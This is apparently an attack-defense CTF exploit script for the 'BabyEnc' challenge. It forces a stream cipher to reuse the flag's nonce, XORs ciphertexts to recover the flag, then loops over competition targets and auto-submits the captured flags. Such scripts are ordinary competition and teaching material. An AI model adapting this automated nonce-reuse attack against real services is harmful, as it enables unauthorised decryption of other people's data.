#!/usr/bin/env python3
"""
BabyEnc Exploit
===============
Exploits nonce reuse + vault info leak to recover encrypted flag.

Vulnerability:
1. Stream cipher uses only 2 nonces (toggled by g_state+0x40)
2. Flag encrypted with nonce 0, but toggle starts at 1 (uses nonce 1)
3. Decrypt sets toggle to note_index, allowing nonce control

Attack:
1. Create note at even index (e.g., 2), encrypt (uses nonce 1)
2. Decrypt that note -> toggle becomes 2 (even)
3. Create another note, encrypt -> uses nonce 0 (same as flag!)
4. XOR ciphertexts to recover flag

Usage:
    python3 exploit_babyenc.py local        # Test locally
    python3 exploit_babyenc.py debug        # Debug with GDB
    python3 exploit_babyenc.py              # Attack all targets
    python3 exploit_babyenc.py 172.28.32.32 # Attack specific IP
    python3 exploit_babyenc.py --loop       # Continuous mode
"""

import sys
import os

os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *
from pwn_lib import (
    setup_binary, add_breakpoint, get_io, shortcuts,
    p64, p32, u64, u32, uu64, uu32,
)
from awd_lib import (
    chal, submit, targets, our_ip,
    setup_auth, print_info,
)

# === CHALLENGE CONFIG ===
BINARY = "./src/chall"
LIBC = "./src/libc.so.6"
PORT = 1000           # Service port (was 9999, actually 1000)
TIMEOUT = 10
LOOP_DELAY = 60

# Configure for this challenge
chal(
    creds_file="babyenc.xls",
    pem_file="auth.pem",
)

context.log_level = 'error'
context.timeout = TIMEOUT

# ========================
# EXPLOIT HELPERS
# ========================

def menu(io):
    io.recvuntil(b"> ")

def list_notes(io):
    """List notes and get flag cipher length from slot 0."""
    menu(io)
    io.sendline(b"7")
    io.recvuntil(b"0: system (enc) len=")
    flag_len = int(io.recvline().strip())
    return flag_len

def create_note(io, idx, size, data):
    """Create a note at index with given size and hex data."""
    menu(io)
    io.sendline(b"1")
    io.recvuntil(b"index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"length: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"data hex: ")
    io.sendline(data.hex().encode())

def show_note(io, idx):
    """Show note plaintext (option 3)."""
    menu(io)
    io.sendline(b"3")
    io.recvuntil(b"index: ")
    io.sendline(str(idx).encode())
    # Check response
    resp = io.recvuntil(b"\n1)")
    if b"note cipher(hex):" in resp:
        # Note is encrypted, parse hex
        start = resp.find(b"note cipher(hex): ") + len(b"note cipher(hex): ")
        end = resp.find(b"\n", start)
        return bytes.fromhex(resp[start:end].decode()), True
    elif b"plaintext: " in resp:
        start = resp.find(b"plaintext: ") + len(b"plaintext: ")
        end = resp.find(b"\n", start)
        return bytes.fromhex(resp[start:end].decode()), False
    return b"", False

def encrypt_note(io, idx):
    """Encrypt a note (option 4) and get ciphertext."""
    menu(io)
    io.sendline(b"4")
    io.recvuntil(b"index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"note cipher(hex): ")
    line = io.recvline().strip()
    return bytes.fromhex(line.decode())

def decrypt_note(io, idx):
    """Decrypt a note (option 5)."""
    menu(io)
    io.sendline(b"5")
    io.recvuntil(b"index: ")
    io.sendline(str(idx).encode())

def get_flag_cipher(io):
    """Get encrypted flag from slot 0 via show (option 3)."""
    menu(io)
    io.sendline(b"3")
    io.recvuntil(b"index: ")
    io.sendline(b"0")
    io.recvuntil(b"system note (enc): ")
    line = io.recvline().strip()
    return bytes.fromhex(line.decode())

def edit_note(io, idx, data):
    """Edit a note with new data (option 2)."""
    menu(io)
    io.sendline(b"2")
    io.recvuntil(b"index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"data hex: ")
    io.sendline(data.hex().encode())

def delete_note(io, idx):
    """Delete a note (option 6)."""
    menu(io)
    io.sendline(b"6")
    io.recvuntil(b"index: ")
    io.sendline(str(idx).encode())

def xor_bytes(a, b):
    """XOR two byte strings."""
    return bytes(x ^ y for x, y in zip(a, b))

# ========================
# EXPLOIT LOGIC
# ========================

def exploit(ip, port):
    """
    Exploit nonce reuse to recover flag.
    
    Analysis:
    - Flag encrypted with nonce 0 (g_state+0x48)
    - Toggle starts at 1, so encrypt uses: (toggle & 1) + 8 as index
    - toggle=1 -> index 9 -> nonce 1 (g_state+0x50)
    - toggle=0 (or 2,4,6...) -> index 8 -> nonce 0 (g_state+0x48)
    - decrypt sets toggle = note_index
    
    Strategy:
    1. Create and encrypt note (uses nonce 1, toggle stays 1)
    2. Create and encrypt another note at even index (uses nonce 1)
    3. Decrypt that note -> toggle becomes even (e.g., 2)
    4. Create and encrypt new note -> uses nonce 0 (same as flag!)
    5. XOR to recover flag
    """
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        
        # Get flag length from list
        flag_len = list_notes(io)
        
        # Get encrypted flag
        flag_cipher = get_flag_cipher(io)
        
        known = b"A" * flag_len
        
        # Step 1: Create note at index 2 (even)
        create_note(io, 2, flag_len, known)
        encrypt_note(io, 2)  # Uses nonce 1 (toggle=1)
        
        # Step 2: Decrypt note 2 -> toggle becomes 2
        decrypt_note(io, 2)
        
        # Step 3: Now toggle=2, encrypt will use nonce 0!
        create_note(io, 3, flag_len, known)
        note_cipher = encrypt_note(io, 3)
        
        # Recover keystream for nonce 0
        keystream = xor_bytes(note_cipher, known)
        
        # Decrypt flag
        flag = xor_bytes(flag_cipher, keystream)
        
        io.close()
        
        try:
            return flag.decode()
        except:
            return flag.decode(errors='ignore')
        
    except Exception as e:
        log.error(f"Exploit failed: {e}")
        return None


def exploit_dev(io):
    """Development version for local testing."""
    context.log_level = 'debug'
    
    # Get flag length from list
    flag_len = list_notes(io)
    print(f"[*] Flag length: {flag_len}")
    
    # Get encrypted flag
    flag_cipher = get_flag_cipher(io)
    print(f"[*] Flag cipher: {flag_cipher.hex()}")
    
    known = b"A" * flag_len
    
    # Create note at even index, encrypt, then decrypt to set toggle to even
    create_note(io, 2, flag_len, known)
    encrypt_note(io, 2)
    decrypt_note(io, 2)
    
    # Now encrypt with nonce 0
    create_note(io, 3, flag_len, known)
    note_cipher = encrypt_note(io, 3)
    print(f"[*] Note cipher (nonce 0): {note_cipher.hex()}")
    
    keystream = xor_bytes(note_cipher, known)
    flag = xor_bytes(flag_cipher, keystream)
    print(f"[+] Flag: {flag}")
    
    io.interactive()


# ========================
# RUNNER
# ========================

def run_single(ip):
    """Run exploit against a single target."""
    print(f"[*] Attacking {ip}:{PORT}...")
    flag = exploit(ip, PORT)
    
    if flag:
        print(f"[+] Got flag: {flag}")
        result = submit(flag, target=ip)
        if result["success"]:
            status = "(duplicate)" if result["duplicate"] else "NEW!"
            print(f"[+] Submitted {status}")
        else:
            print(f"[-] Submit failed: {result['message']}")
        return True
    else:
        print(f"[-] No flag from {ip}")
        return False


def run_all():
    """Run exploit against all targets."""
    target_list = targets()
    print(f"[*] Our IP: {our_ip()}")
    print(f"[*] Targets: {len(target_list)}")
    
    success = failed = 0
    for ip in target_list:
        if run_single(ip):
            success += 1
        else:
            failed += 1
    
    print(f"\n[*] Done: {success} success, {failed} failed")


def main():
    try:
        setup_auth()
    except:
        pass
    
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        
        if arg == "local":
            context.log_level = 'debug'
            setup_binary(BINARY, LIBC, log_level='debug')
            io = get_io("_local")
            exploit_dev(io)
        elif arg == "debug":
            context.log_level = 'debug'
            setup_binary(BINARY, LIBC, log_level='debug')
            add_breakpoint('main+0x4db')  # vault copy
            io = get_io("_debug")
            exploit_dev(io)
        elif arg == "--loop":
            import time
            while True:
                run_all()
                print(f"[*] Sleeping {LOOP_DELAY}s...")
                time.sleep(LOOP_DELAY)
        elif arg == "--info":
            print_info()
        else:
            run_single(arg)
    else:
        run_all()


if __name__ == "__main__":
    main()
